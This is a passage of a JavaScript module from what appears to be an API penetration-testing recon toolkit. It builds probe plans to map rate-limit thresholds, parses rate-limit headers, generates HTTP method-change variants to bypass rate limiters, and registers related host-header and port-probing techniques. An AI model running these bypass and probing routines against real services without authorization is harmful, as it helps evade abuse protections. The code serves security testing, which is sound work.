  return { grpcDetected, reflectionEnabled, indicators, findings };
}

// ---------------------------------------------------------------------------
// Idea 01148 — rate-limit threshold mapping
// ---------------------------------------------------------------------------

/**
 * Idea 01148 — build a threshold-mapping plan: per endpoint, an ordered
 * burst of probe descriptors (sequence index embedded in the label) so the
 * operator can find the exact request count where 429s start.
 * @param {string[]} endpoints - Endpoint paths to burst.
 * @param {{burstSize?: number, method?: string, intervalMs?: number}} [options]
 * @returns {{endpoints: string[], burstSize: number, intervalMs: number, probes: object[]}}
 */
export function buildThresholdMappingPlan(endpoints = [], options = {}) {
  const { burstSize = 60, method = 'GET', intervalMs = 0 } = options;
  const cleanEndpoints = (endpoints || []).map(e => String(e || '').trim()).filter(Boolean);
  const probes = [];
  for (const endpoint of cleanEndpoints) {
    for (let i = 1; i <= Math.max(1, burstSize); i++) {
      probes.push(normalizeProbe({
        label: `ratelimit-burst:${endpoint}#${i}`,
        path: endpoint,
        method,
        detect: `threshold hit at the first sequence index whose response is 429 — record the cutoff and keep bursting a few more to confirm the window holds`,
      }));
    }
  }
  return { endpoints: cleanEndpoints, burstSize: Math.max(1, burstSize), intervalMs: Number(intervalMs) || 0, probes };
}

/**
 * Idea 01148 — record 429 cutoffs from operator-supplied burst records:
 * for each endpoint, find the first sequence index that returned 429 and
 * summarize the pre-cutoff status distribution.
 * @param {{label: string, status?: number}[]} records - Labels must look like `ratelimit-burst:<endpoint>#<n>`.
 * @returns {{thresholds: {endpoint: string, totalRequests: number, first429Index: number|null, cutoff: number|null, statuses: object}[], findings: object[]}}
 */
export function recordThresholdFromBurst(records = []) {
  const byEndpoint = new Map();
  const re = /^ratelimit-burst:(.+)#(\d+)$/;
  for (const r of records || []) {
    if (!r || !r.label) continue;
    const m = String(r.label).match(re);
    if (!m) continue;
    const endpoint = m[1];
    const seq = Number(m[2]);
    if (!byEndpoint.has(endpoint)) byEndpoint.set(endpoint, []);
    byEndpoint.get(endpoint).push({ seq, status: Number(r.status) });
  }
  const thresholds = [];
  const findings = [];
  for (const [endpoint, entries] of [...byEndpoint.entries()].sort((a, b) => a[0].localeCompare(b[0]))) {
    entries.sort((a, b) => a.seq - b.seq);
    const statuses = {};
    let first429Index = null;
    for (const e of entries) {
      statuses[e.status] = (statuses[e.status] || 0) + 1;
      if (first429Index === null && e.status === 429) first429Index = e.seq;
    }
    const cutoff = first429Index === null ? null : first429Index - 1;
    thresholds.push({ endpoint, totalRequests: entries.length, first429Index, cutoff, statuses });
    if (first429Index !== null) {
      findings.push({
        type: 'ratelimit-threshold-mapped',
        confidence: 'high',
        evidence: `Endpoint "${endpoint}" starts returning 429 at request #${first429Index} — the effective limit is ~${cutoff} request(s) per window; this route is abuse-sensitive.`,
        endpoint,
        first429Index,
        cutoff,
      });
    } else {
      findings.push({
        type: 'ratelimit-threshold-not-reached',
        confidence: 'medium',
        evidence: `Endpoint "${endpoint}" never returned 429 across ${entries.length} requests — no per-endpoint limit found within this burst size.`,
        endpoint,
      });
    }
  }
  return { thresholds, findings };
}

// ---------------------------------------------------------------------------
// Idea 01149 — rate-limit header parsing
// ---------------------------------------------------------------------------

/**
 * Idea 01149 — parse rate-limit headers from a response into a normalized
 * quota model: X-RateLimit-Limit/Remaining/Reset, Retry-After, the
 * X-Rate-Limit-* dash variants, and the IETF draft `RateLimit` header.
 * @param {object} headers - Response headers (case-insensitive keys).
 * @param {{nowMs?: number}} [options]
 * @returns {{limit: number|null, remaining: number|null, used: number|null, resetEpochMs: number|null, retryAfterSeconds: number|null, windowSeconds: number|null, policy: string|null, sources: string[]}}
 */
export function parseRateLimitHeaders(headers = {}, options = {}) {
  const { nowMs = Date.now() } = options;
  const lower = lowerHeaders(headers);
  const pick = (...names) => {
    for (const n of names) {
      if (lower[n] != null && lower[n] !== '') return lower[n];
    }
    return null;
  };
  const toInt = v => {
    if (v == null) return null;
    const n = Number(String(v).split(',')[0].trim());
    return Number.isFinite(n) ? Math.trunc(n) : null;
  };
  const limit = toInt(pick('x-ratelimit-limit', 'x-rate-limit-limit', 'ratelimit-limit'));
  const remaining = toInt(pick('x-ratelimit-remaining', 'x-rate-limit-remaining', 'ratelimit-remaining'));
  const used = toInt(pick('x-ratelimit-used', 'ratelimit-used'));
  const resetRaw = pick('x-ratelimit-reset', 'x-rate-limit-reset', 'ratelimit-reset');
  const retryAfterRaw = pick('retry-after');
  const policy = pick('ratelimit-policy') || pick('x-ratelimit-policy') || null;

  let resetEpochMs = null;
  if (resetRaw != null) {
    const n = Number(String(resetRaw).trim());
    if (Number.isFinite(n)) {
      // Reset is epoch seconds when large, otherwise seconds-until-reset.
      resetEpochMs = n > 1e12 ? Math.trunc(n) : n > 1e9 ? Math.trunc(n * 1000) : Math.trunc(nowMs + n * 1000);
    }
  }
  let retryAfterSeconds = null;
  if (retryAfterRaw != null) {
    const asDate = Date.parse(String(retryAfterRaw).trim());
    if (!Number.isNaN(asDate)) {
      retryAfterSeconds = Math.max(0, Math.round((asDate - nowMs) / 1000));
    } else {
      const n = Number(String(retryAfterRaw).trim());
      retryAfterSeconds = Number.isFinite(n) ? Math.max(0, Math.trunc(n)) : null;
    }
  }
  // IETF draft `RateLimit: limit=100, remaining=50, reset=10` compact form.
  const draft = lower['ratelimit'];
  let draftLimit = null;
  let draftRemaining = null;
  let draftReset = null;
  if (draft) {
    for (const part of String(draft).split(',')) {
      const [k, v] = part.split('=').map(s => (s || '').trim().toLowerCase());
      const n = Number(v);
      if (!Number.isFinite(n)) continue;
      if (k === 'limit') draftLimit = Math.trunc(n);
      if (k === 'remaining') draftRemaining = Math.trunc(n);
      if (k === 'reset') draftReset = Math.trunc(n);
    }
  }
  const sources = [];
  if (limit !== null) sources.push('x-ratelimit-limit');
  if (remaining !== null) sources.push('x-ratelimit-remaining');
  if (resetEpochMs !== null) sources.push('x-ratelimit-reset');
  if (retryAfterSeconds !== null) sources.push('retry-after');
  if (draftLimit !== null) sources.push('ratelimit(draft)');

  const effectiveLimit = limit !== null ? limit : draftLimit;
  const effectiveRemaining = remaining !== null ? remaining : draftRemaining;
  let windowSeconds = null;
  if (draftReset !== null) {
    windowSeconds = draftReset;
  } else if (resetEpochMs !== null) {
    windowSeconds = Math.max(1, Math.round((resetEpochMs - nowMs) / 1000));
  }
  return {
    limit: effectiveLimit,
    remaining: effectiveRemaining,
    used,
    resetEpochMs,
    retryAfterSeconds,
    windowSeconds,
    policy,
    sources,
  };
}

/**
 * Idea 01149 — aggregate parsed rate-limit header samples into a
 * quota/window model: the disclosed quota, the tightest observed window,
 * and the median reset horizon across samples.
 * @param {{limit?: number|null, remaining?: number|null, windowSeconds?: number|null, resetEpochMs?: number|null}[]} samples
 * @param {{nowMs?: number}} [options]
 * @returns {{samples: number, quota: number|null, minWindowSeconds: number|null, medianResetInSeconds: number|null, depleted: boolean, findings: object[]}}
 */
export function modelQuotaWindow(samples = [], options = {}) {
  const { nowMs = Date.now() } = options;
  const list = (samples || []).filter(s => s && typeof s === 'object');
  const limits = list.map(s => s.limit).filter(Number.isFinite);
  const windows = list.map(s => s.windowSeconds).filter(v => Number.isFinite(v) && v > 0);
  const resetsIn = list
    .map(s => (Number.isFinite(s.resetEpochMs) ? (s.resetEpochMs - nowMs) / 1000 : null))
    .filter(v => v !== null && Number.isFinite(v) && v >= 0);
  const quota = limits.length ? Math.min(...limits) : null;
  const minWindowSeconds = windows.length ? Math.min(...windows) : null;
  const medianResetInSeconds = median(resetsIn) === null ? null : Math.round(median(resetsIn));
  const depleted = list.some(s => s.remaining === 0);
  const findings = [];
  if (quota !== null) {
    findings.push({
      type: 'ratelimit-quota-disclosed',
      confidence: 'high',
      evidence: `Rate-limit headers disclose a quota of ${quota} request(s)${minWindowSeconds !== null ? ` per ~${minWindowSeconds}s window` : ''} across ${list.length} sample(s)${depleted ? ' — at least one sample shows the quota fully depleted (remaining=0)' : ''}.`,
      quota,
      minWindowSeconds,
    });
  }
  return { samples: list.length, quota, minWindowSeconds, medianResetInSeconds, depleted, findings };
}

/**
 * Idea 01149 — collect and parse rate-limit headers across
 * operator-supplied response records, grouped by endpoint label.
 * @param {{label: string, headers?: object}[]} records
 * @param {{nowMs?: number}} [options]
 * @returns {{byEndpoint: {label: string, parsed: object}[], model: object}}
 */
export function collectRateLimitHeaders(records = [], options = {}) {
  const byEndpoint = [];
  const samples = [];
  for (const r of records || []) {
    if (!r || !r.label) continue;
    const parsed = parseRateLimitHeaders(r.headers || {}, options);
    byEndpoint.push({ label: String(r.label), parsed });
    samples.push(parsed);
  }
  return { byEndpoint, model: modelQuotaWindow(samples, options) };
}

// ---------------------------------------------------------------------------
// Idea 01150 — rate-limit bypass via method change
// ---------------------------------------------------------------------------

/**
 * Idea 01150 — build method-change bypass variants for a rate-limited
 * request: the same path retried as GET/PUT/PATCH/DELETE/HEAD/OPTIONS
 * (plus a case-flipped twin), because limiters sometimes key only on
 * specific methods.
 * @param {string} path - The rate-limited path.
 * @param {string} [limitedMethod] - The method that got limited (e.g. "POST").
 * @param {{methods?: string[]}} [options]
 * @returns {object[]} Probe descriptors.
 */
export function buildMethodChangeBypassVariants(path = '/', limitedMethod = 'POST', options = {}) {
  const { methods = ['GET', 'PUT', 'PATCH', 'DELETE', 'HEAD', 'OPTIONS'] } = options;
  const clean = String(path || '/').trim() || '/';
  const limited = String(limitedMethod || 'POST').toUpperCase();
  const variants = [];
  variants.push(normalizeProbe({
    label: `method-bypass:${clean}:${limited}:baseline`,
    path: clean,
    method: limited,
    detect: `baseline: the ${limited} that is (or was) rate-limited — expect 429`,
  }));
  for (const m of methods || []) {
    const method = String(m).toUpperCase();
    if (method === limited) continue;
    variants.push(normalizeProbe({
      label: `method-bypass:${clean}:${limited}->${method}`,
      path: clean,
      method,
      detect: `bypass if this ${method} returns non-429 (2xx/4xx-other) while the ${limited} baseline is 429 — the limiter keys on method`,
    }));
  }
  // Case-flipped twin of the limited method (some routers normalize, some limiters do not).
  const flipped = limited === limited.toLowerCase() ? limited.toUpperCase() : limited.toLowerCase();
  if (flipped !== limited) {
    variants.push({
      label: `method-bypass:${clean}:${limited}->${flipped}`,
      path: clean,
      method: flipped,
      methodCased: flipped,
      headers: {},
      detect: `bypass if the case-flipped ${flipped} escapes the 429 the canonical ${limited} hits`,
    });
  }
  return variants;
}

/**
 * Idea 01150 — analyze method-change bypass attempts: variants that
 * escaped 429 while the baseline method stayed limited indicate the
 * limiter keys on method.
 * @param {{label: string, status?: number}[]} records
 * @returns {{bypassed: {label: string, method: string, status: number}[], stillLimited: string[], findings: object[]}}
 */
export function analyzeMethodChangeBypass(records = []) {
  const baseline = (records || []).find(r => r && r.label && r.label.endsWith(':baseline'));
  const baselineLimited = baseline ? Number(baseline.status) === 429 : false;
  const bypassed = [];
  const stillLimited = [];
  const findings = [];
  for (const r of records || []) {
    if (!r || !r.label || r.label.endsWith(':baseline')) continue;
    const status = Number(r.status);
    const method = String(r.label).split('->').pop() || '';
    if (baselineLimited && status !== 429) {
      bypassed.push({ label: String(r.label), method, status });
      findings.push({
        type: 'ratelimit-method-bypass',
        confidence: 'high',
        evidence: `Retrying as ${method} returned ${status} while the baseline method was 429-limited — the rate limiter keys on HTTP method, so method change bypasses it.`,
        method,
      });
    } else {
      stillLimited.push(String(r.label));
    }
  }
  return { bypassed, stillLimited: stillLimited.sort(), findings };
}

// ---------------------------------------------------------------------------
// Report finding builder + registry
// ---------------------------------------------------------------------------

/**
 * Build a uniform report finding from a header/port/rate-limit recon
 * result.
 * @param {{title?: string, kind?: string, evidence?: string, targets?: string[], confidence?: string}} result
 * @returns {{title: string, severity: string, confidence: string, kind: string, evidence: string, targets: string[], recommendation: string}}
 */
export function headerPortRateReconFinding(result = {}) {
  const { title = 'Header/port/rate-limit recon finding', kind = 'recon', evidence = '', targets = [], confidence = 'medium' } = result;
  return {
    title: `Header/port/rate-limit recon — ${title}`,
    severity: 'Info',
    confidence,
    kind,
    evidence,
    targets: Array.isArray(targets) ? targets : [],
    recommendation:
      'On the authorized target: normalize and re-encode request paths at every layer so gateway cleaning matches backend routing; never trust internal-trust or forwarded-host headers from untrusted networks; ' +
      'disable debug/verbose flags in production; bind dev services to loopback and firewall alternate ports; disable gRPC reflection in production; ' +
      'apply rate limits per route+method with consistent 429s and minimal header disclosure.',
  };
}

/**
 * Idea-number → primary technique-function registry. Exactly one entry per
 * idea 01141–01150, so 10/10 coverage is verifiable by key count.
 */
export const HEADER_PORT_RATE_RECON = {
  '01141': buildTraversalSequenceProbes,
  '01142': buildInternalTrustProbes,
  '01143': buildDebugVerboseProbes,
  '01144': buildHostHeaderProbes,
  '01145': buildForwardedHostProbes,
  '01146': buildAlternatePortProbes,
  '01147': buildGrpcPortProbes,
  '01148': buildThresholdMappingPlan,
  '01149': parseRateLimitHeaders,
  '01150': buildMethodChangeBypassVariants,
};

export default {
  ...HEADER_PORT_RATE_RECON,
  // Secondary builders / analyzers / dictionaries:
  TRAVERSAL_TOKENS,
  classifyTraversalDesync,
  INTERNAL_TRUST_HEADERS,
  internalTrustHeaderDictionary,
  analyzeInternalTrustResponses,
  DEBUG_HEADER_DICTIONARY,
  debugHeaderDictionary,
  detectDebugVerboseSignals,
  internalHostnameCandidates,
  analyzeHostHeaderRouting,
  FORWARDED_HOST_HEADERS,
  forwardedHostSpoofValues,
  analyzeForwardedHostRouting,
  ALTERNATE_API_PORTS,
  EXTENDED_ALTERNATE_PORTS,
  alternatePortSweepPlan,
  classifyPortSweepResults,
  GRPC_DEFAULT_PORT,
  GRPC_REFLECTION_SERVICES,
  parseGrpcReflectionIndicators,
  recordThresholdFromBurst,
  modelQuotaWindow,
  collectRateLimitHeaders,
  analyzeMethodChangeBypass,
  headerPortRateReconFinding,
  HEADER_PORT_RATE_RECON,
};
